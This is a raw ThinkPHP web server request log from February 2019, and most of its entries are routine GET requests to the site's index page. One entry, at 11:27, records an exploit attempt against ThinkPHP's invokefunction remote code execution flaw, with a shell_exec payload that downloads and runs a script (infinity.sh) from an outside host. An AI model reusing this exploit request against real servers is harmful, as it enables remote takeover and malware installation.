---------------------------------------------------------------
[ 2019-02-09T00:27:12+08:00 ] 165.255.104.198 GET 148.70.73.177:80/
[运行时间：0.012179s] [吞吐率：82.11req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T02:25:48+08:00 ] 185.248.100.159 GET 148.70.73.177/z/style.css
[运行时间：0.013125s] [吞吐率：76.19req/s] [内存消耗：1,365.27kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'z',
    1 => 'style.css',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T03:32:58+08:00 ] 142.59.211.6 GET 148.70.73.177:80/
[运行时间：0.010791s] [吞吐率：92.67req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T04:52:49+08:00 ] 189.79.92.10 GET 148.70.73.177:80/
[运行时间：0.016571s] [吞吐率：60.35req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T05:51:22+08:00 ] 27.111.17.230 GET 148.70.73.177:80/
[运行时间：0.016339s] [吞吐率：61.20req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T06:59:32+08:00 ] 103.85.121.224 GET 148.70.73.177:80/
[运行时间：0.011692s] [吞吐率：85.53req/s] [内存消耗：1,243.09kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T07:24:37+08:00 ] 200.45.23.162 GET 148.70.73.177:80/
[运行时间：0.029017s] [吞吐率：34.46req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T11:27:08+08:00 ] 185.244.25.128 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.ga/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
[运行时间：0.111850s] [吞吐率：8.94req/s] [内存消耗：1,366.54kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Go-http-client/1.1',
  'host' => '148.70.73.177:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'shell_exec',
    1 => 
    array (
      0 => 'wget http://infinityondemand.ga/bins/infinity.sh; chmod  x infinity.sh; sh infinity.sh ',
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T13:08:50+08:00 ] 46.34.174.187 GET 148.70.73.177/
[运行时间：0.014661s] [吞吐率：68.21req/s] [内存消耗：1,243.60kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'host' => '148.70.73.177',
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T13:23:00+08:00 ] 37.152.163.76 GET 148.70.73.177/
[运行时间：0.015629s] [吞吐率：63.98req/s] [内存消耗：1,245.42kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=2419200',
  'host' => '148.70.73.177',
  'x-loop-control' => '37.152.163.76 298DB9AB931D3359A5AAC0327FBEFB2C, 1.0 internal',
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T13:23:03+08:00 ] 37.152.163.76 GET 148.70.73.177/
[运行时间：0.018621s] [吞吐率：53.70req/s] [内存消耗：1,245.42kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=2419200',
  'host' => '148.70.73.177',
  'x-loop-control' => '37.152.163.76 298DB9AB931D3359A5AAC0327FBEFB2C, 1.0 internal',
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T13:23:21+08:00 ] 37.152.163.76 GET 148.70.73.177/
[运行时间：0.014315s] [吞吐率：69.86req/s] [内存消耗：1,245.42kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=2419200',
  'host' => '148.70.73.177',
  'x-loop-control' => '37.152.163.76 298DB9AB931D3359A5AAC0327FBEFB2C, 1.0 internal',
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T13:41:26+08:00 ] 179.5.193.2 GET 148.70.73.177:80/
[运行时间：0.010841s] [吞吐率：92.24req/s] [内存消耗：1,243.09kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T14:48:58+08:00 ] 103.70.145.40 GET 148.70.73.177:80/
[运行时间：0.013327s] [吞吐率：75.03req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T15:59:20+08:00 ] 121.180.21.222 GET 148.70.73.177/
[运行时间：0.011230s] [吞吐率：89.05req/s] [内存消耗：1,242.41kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'curl/7.43.0',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T19:33:59+08:00 ] 106.251.162.103 GET 148.70.73.177/
[运行时间：0.015938s] [吞吐率：62.74req/s] [内存消耗：1,242.66kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '148.70.73.177',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T19:55:36+08:00 ] 200.161.190.6 GET 148.70.73.177:80/
[运行时间：0.012065s] [吞吐率：82.88req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T21:20:43+08:00 ] 45.7.118.50 GET 148.70.73.177:80/
[运行时间：0.012433s] [吞吐率：80.43req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-09T22:55:51+08:00 ] 152.254.145.119 GET 148.70.73.177:80/
[运行时间：0.010734s] [吞吐率：93.16req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
